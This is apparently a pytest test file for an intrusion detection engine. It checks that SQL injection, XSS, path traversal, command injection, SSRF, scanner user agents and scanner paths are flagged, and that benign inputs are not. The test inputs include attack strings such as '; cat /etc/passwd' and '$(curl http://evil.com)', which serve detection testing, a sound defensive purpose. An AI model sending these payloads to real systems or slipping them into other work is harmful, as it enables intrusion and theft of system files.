"""Tests for idps.engine (signature matching with normalization and evasions)."""

from __future__ import annotations

import pytest

from idps.engine import Engine

_SEVERITY_ORDER = {"low": 0, "medium": 1, "high": 2, "critical": 3}


def _max_severity(hits):
    return max((h["severity"] for h in hits), key=lambda s: _SEVERITY_ORDER.get(s, 0))


@pytest.fixture
def engine():
    return Engine()


# --- SQLi ---

@pytest.mark.parametrize("payload", [
    "UNION SELECT username, password FROM users",
    "OR 1=1 --",
    "SLEEP(5)",
    "BENCHMARK(1000000,MD5(1))",
    "; DROP TABLE users;",
    "information_schema.tables",
])
def test_sqli_detected(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) > 0
    assert _max_severity(hits) in ("high", "critical")


@pytest.mark.parametrize("payload", [
    "%2527%2520OR%25201%253D1",  # double-encoded
    "union%20select%201,2",    # single-encoded
    "sleep%281%29",            # encoded parens
])
def test_sqli_encoded_evasion(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) > 0, f"should detect encoded payload: {payload}"


@pytest.mark.parametrize("payload", ["hello world", "product search", "price range"])
def test_sqli_benign(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) == 0, f"false positive on: {payload}"


# --- XSS ---

@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "<img onerror=alert(1)>",
    "javascript:alert(1)",
    "<img src=x onerror=console.log(1)>",
])
def test_xss_detected(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) > 0, f"should detect XSS: {payload}"
    assert _max_severity(hits) in ("high", "medium")


@pytest.mark.parametrize("payload", ["<script>", "onload=", "javascript:"])
def test_xss_encoded(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) > 0, f"should detect encoded XSS: {payload}"


@pytest.mark.parametrize("payload", ["hello world", "normal search query"])
def test_xss_benign(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) == 0, f"false positive on: {payload}"


# --- Path traversal ---

@pytest.mark.parametrize("payload", [
    "../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    "/etc/passwd",
    "/var/www/../../../etc/passwd",
])
def test_traversal_detected(engine, payload):
    hits = engine.inspect("GET", payload, "", {}, "")
    assert len(hits) > 0, f"should detect traversal: {payload}"
    assert _max_severity(hits) in ("high", "critical")


@pytest.mark.parametrize("payload", ["/about", "/contact", "/products"])
def test_traversal_benign(engine, payload):
    hits = engine.inspect("GET", payload, "", {}, "")
    assert len(hits) == 0, f"false positive on: {payload}"


# --- Command injection ---

@pytest.mark.parametrize("payload", [
    "; cat /etc/passwd",
    "| whoami",
    "&& id",
    "`uname -a`",
    "$(curl http://evil.com)",
])
def test_cmd_injection_detected(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) > 0, f"should detect command injection: {payload}"
    assert _max_severity(hits) == "critical"


@pytest.mark.parametrize("payload", ["hello", "foo and bar", "a;b without command"])
def test_cmd_injection_benign(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) == 0, f"false positive on: {payload}"


# --- SSRF ---

@pytest.mark.parametrize("payload", [
    "http://169.254.169.254/metadata",
    "localhost",
    "127.0.0.1",
])
def test_ssrf_detected(engine, payload):
    hits = engine.inspect("GET", "/search", payload, {}, "")
    assert len(hits) > 0, f"should detect SSRF: {payload}"


# --- Bad user agents ---

@pytest.mark.parametrize(("payload", "ua"), [
    ("", "sqlmap/1.0"),
    ("", "nikto/2.0"),
    ("", "Nmap Scripting Engine"),
    ("", "masscan/1.0"),
])
def test_bad_user_agent_detected(engine, payload, ua):
    hits = engine.inspect("GET", "/", payload, {"user-agent": ua}, "")
    assert len(hits) > 0, f"should detect bad UA: {ua}"


# --- Scanner paths ---

@pytest.mark.parametrize("path", [
    "/.env",
    "/wp-admin/",
    "/.git/config",
    "/phpmyadmin/",
    "/server-status",
])
def test_scanner_path_detected(engine, path):
    hits = engine.inspect("GET", path, "", {}, "")
    assert len(hits) > 0, f"should detect scanner path: {path}"


@pytest.mark.parametrize("path", ["/", "/about", "/search", "/login"])
def test_scanner_path_benign(engine, path):
    hits = engine.inspect("GET", path, "", {}, "")
    assert len(hits) == 0, f"false positive on: {path}"


# --- Engine never raises on malformed input ---
def test_engine_never_raises(engine):
    hits = engine.inspect("GET", "\x00\x01\x02", "\x00bad", {"user-agent": "\x00"}, "\x00")
    assert isinstance(hits, list)


# --- Null byte stripping ---
def test_null_byte_stripped(engine):
    hits = engine.inspect("GET", "/search", "UNION\x00SELECT 1,2", {}, "")
    assert len(hits) > 0, "should detect SQLi with null bytes stripped"